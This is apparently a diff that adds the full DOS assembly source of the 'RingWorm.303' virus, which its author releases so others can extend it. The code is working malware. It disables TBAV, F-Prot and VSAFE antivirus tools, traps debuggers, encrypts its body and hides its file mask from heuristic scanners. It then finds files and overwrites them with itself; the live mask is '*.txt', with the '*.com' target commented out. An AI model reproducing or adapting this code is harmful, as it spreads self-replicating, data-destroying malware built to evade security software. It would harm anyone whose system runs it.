@@ -1,0 +1,232 @@
+; ==[ The RingWorm.303 Virus ]===============================================
+;
+; I don't have any time to comment this virus, just let me say that it is
+; firmly anti-heuristic, armoured, and has an interesting debugger /
+; disassembler trap at the end of the decryption routine, see if you can
+; find it... It is overwriting, because, again, I was testing the method,
+; and didn't want to be bothered with a feature-full virus; if the method
+; worked, which it does, I was to write a cool virus... Unfortunately, I
+; haven't the time right now, so I am releasing this code so that you can.
+; The two instructions to watch are:
+;
+;       mov     ax, 0FFEBh
+;       jcxz    $ - 2
+;
+; Trace the jumps through with debug, you don't have to run it, just 'u' the
+; jump addresses until you see what it does. See the Airwalker viruses for
+; most of the anti-heuristic tricks used in this baby; as for the rest, just
+; enjoy...
+;
+; ==========================================================[ code begins ]==
+
+.model tiny
+.286
+.code
+
+        org     100h
+
+virus_start:
+        mov     ax, offset decrypt
+        call    ax
+
+start_encrypt:
+        xchg    ax, cx
+	mov	es, ax
+
+        mov     word ptr es:[1h*4], offset my_int1
+        mov     word ptr es:[1h*4+2], cs
+
+        mov     word ptr es:[3h*4], offset my_int3
+        mov     word ptr es:[3h*4+2], cs
+
+        push    cs
+        pop     es
+
+        mov     ax, 0CA02h
+        xor     bl, bl
+        int     2Fh                             ; disable TBAV's TBSCANX
+
+        cli                                     ; clear maskable interrupts
+
+        neg     sp                              ; disable TBAV - this code
+        neg     sp                              ; emulates a stack crash
+
+        sti                                     ; set maskable interrupts
+
+        mov     cl, 02h
+        call    anti_fprot                      ; disable F-Prot v1.x F-LOCK
+
+        mov     cl, 03h
+        call    anti_fprot                      ; disable F-Prot v1.x F-XCHK
+
+        mov     cl, 04h
+        call    anti_fprot                      ; disable F-Prot v1.x F-XPOPUP
+
+        mov     cl, 05h
+        call    anti_fprot                      ; disable F-Prot v1.x F-DLOCK
+
+        mov     cl, 07h                         ; disable F-Prot v2.x VIRSTOP
+        call    anti_fprot                      ; boot sector checking
+
+        mov     ax, 0FA01h                      ; wakes up VSAFE to keyboard
+        mov     dx, 5945h                       ; asks VSAFE to de-install
+        int     16h                             ; call VSAFE-hooked interrupt
+
+; ===========================================================================
+; AVP v3.0 build 107 update 03/22/97 will detect the following anti-heuristic
+; code segment, but not if you xor a word on the stack:
+;
+;       xor     word ptr [file_mask + 2], 1717h
+;       xor     byte ptr [file_mask + 4], 19h
+; ===========================================================================
+
+        push    word ptr [file_mask + 2]
+        mov     bx, sp
+        xor     word ptr [bx], 1717h
+        pop     word ptr [file_mask + 2]
+        xor     byte ptr [file_mask + 4], 19h
+
+        mov     ah, 4Eh                         ; ah = 4Eh, find first file
+        xor     cx, cx
+        mov     dx, offset file_mask            ; points to `*.com'
+        int     21h                             ; do it!
+
+find_file:
+        jc      exit_virus                      ; exit if no files found
+
+        mov     ax, 3D02h                       ; open file for read/write
+        mov     dx, 09Eh                        ; location of filename in psp
+        int     21h                             ; do it!
+
+        xchg    bx, ax                          ; put filehandle in bx
+
+        mov     ah, 3Fh                         ; read file from handle in bx
+        mov     cx, 01h                         ; number of bytes to read
+        mov     dx, offset heap                 ; read byte to heap
+        int     21h                             ; do it!
+
+        cmp     byte ptr [heap], 0B8h           ; compare to `mov ax' opcode
+        je      next_file                       ; if infected, find next file
+
+        xor     word ptr [file_mask + 2], 1717h
+        xor     byte ptr [file_mask + 4], 19h
+
+        mov     si, offset write_virus
+        mov     di, offset heap + 0001h
+        mov     cx, offset end_write_virus - offset write_virus
+        rep     movsb
+
+        mov     ah, 2Ch                         ; ah = 2Ch, dos get time
+        int     21h                             ; do it!
+        mov     word ptr[encrypt_key], dx       ; key = dx = seconds:100ths
+
+        mov     ax, 4200h                       ; reset file pointer to top
+        xor     cx, cx                          ; mov cx, 0000h in 2 bytes
+        cwd                                     ; mov dx, 0000h in 1 byte
+        int     21h                             ; do it!
+
+        mov     ah, 40h                         ; write file from handle bx
+        mov     cx, virus_end - virus_start     ; number of bytes to write
+        mov     dx, offset virus_start          ; start writing from cs:100h
+        pusha
+
+        jmp     heap + 0001h
+
+exit_virus:
+        int     20h                             ; we're outta here...
+
+next_file:
+        mov     ah, 3Eh                         ; ah = 3Eh, close file
+        int     21h                             ; do it!
+
+        mov     ah, 4Fh                         ; ah = 4Fh, find next file
+        int     21h                             ; do it!
+
+        jmp     find_file
+
+write_virus:
+        mov     ax, offset decrypt
+        call    ax
+        popa
+        int     21h                             ; write the bitch!
+
+        mov     ah, 3Eh                         ; ah = 3Eh, close file
+        int     21h                             ; do it!
+
+        int     20h
+
+end_write_virus equ     $
+
+virus_name      db      '[ringworm]', 00h
+virus_author    db      '(c) 1997 gothmog', 00h
+
+; ===========================================================================
+; S  Contains a routine to search for executable (.COM or .EXE) files.
+;
+; file_mask     db      '*.com', 00h
+; ===========================================================================
+
+file_mask       db      '*.txt', 00h
+
+anti_fprot:
+        mov     ax, 4653h
+        mov     bx, 0001h
+        xor     ch, ch
+        int     2Fh
+        ret
+
+end_encrypt     equ     $ - 0001h
+
+my_int1:
+        call    my_int1
+
+my_int3:
+        call    my_int3
+
+encrypt:
+decrypt:
+        mov     si, offset start_encrypt
+        mov     di, si
+        xor     bx, bx
+        push    bx             ; zero has to be on stack for zeroing cx below
+
+; (this is done real crazy to be hard to trace, and also very anti-heuristic;
+;  nothing recognizes this entire structure as a decryption loop at all...)
+
+        mov     bx, offset false_jump_2                      ; see note below
+        mov     cx, (end_encrypt - start_encrypt + 1) / 2
+
+xor_loop:
+        lodsw
+        jnc     false_jump
+
+false_jump_2:
+        pop     ax
+        pop     cx
+        stosw
+        loop    xor_loop
+        pop     ax
+        ret
+
+false_jump:
+        db      35h
+
+encrypt_key             dw      0000
+
+        pop     dx
+        push    dx
+        push    cx
+        push    ax
+        xchg    cx, dx
+        mov     ax, 0FFEBh ; <----------------- debugger trap, with next line
+        jcxz    $ - 2      ;         (actually executes a jmp bx instruction)
+
+        call    my_int1
+
+virus_end       equ     $
+
+heap:
+
+        end     virus_start
+
+; ============================================================[ code ends ]==
